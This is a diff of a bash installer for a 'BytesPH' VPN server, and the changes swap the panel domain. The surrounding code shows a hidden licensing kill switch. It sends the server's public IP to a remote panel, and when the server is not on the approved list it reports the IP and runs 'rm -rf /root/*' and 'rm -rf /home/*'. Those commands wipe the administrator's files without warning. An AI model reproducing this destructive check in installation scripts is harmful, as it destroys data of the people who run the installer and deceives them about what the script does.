@@ -15,16 +15,16 @@ apt install curl -y
 MyScriptName='BytesPH'
 MYIP=$(curl -s https://api.ipify.org);
 MYIP2="s/xxxxxxxxx/$MYIP/g";
-DOMAIN="https://astigvpn.bytesph.com"
+DOMAIN="https://syopawvpn.bytesph.com"
 #check if server is from bytesph panel
 echo "Checking..."
-DATA=$(curl -sb -X POST https://astigvpn.bytesph.com/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=check&ip=$MYIP")
+DATA=$(curl -sb -X POST https://syopawvpn.bytesph.com/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=check&ip=$MYIP")
 if [ "$DATA" == "false" ];
 then
  clear
  echo "Installation is exclusive for BytesPH Only. You are not allowed. This incident is already reported to the Admin."
  echo "Exiting now..."
- curl -sb -X POST https://astigvpn.bytesph.com/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=unauthorized&ip=$MYIP"
+ curl -sb -X POST https://syopawvpn.bytesph.com/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=unauthorized&ip=$MYIP"
  sleep 5;
  rm -rf /root/*
  rm -rf /home/*
@@ -37,7 +37,7 @@ SSH_Port1='22'
 SSH_Port2='226'
 
 # Your SSH Banner
-SSH_Banner="https://astigvpn.bytesph.com/server/server-message"
+SSH_Banner="https://syopawvpn.bytesph.com/server/server-message"
 
 # Dropbear Ports
 Dropbear_Port1='442'
@@ -1129,7 +1129,7 @@ fi
  echo -e "[\e[1;31m-\e[0m] Script is now exiting..."
  exit 1
 fi
-DOMAIN="https://astigvpn.bytesph.com"
+DOMAIN="https://syopawvpn.bytesph.com"
  # Begin Installation by Updating and Upgrading machine and then Installing all our wanted packages/services to be install.
  ScriptMessage
 
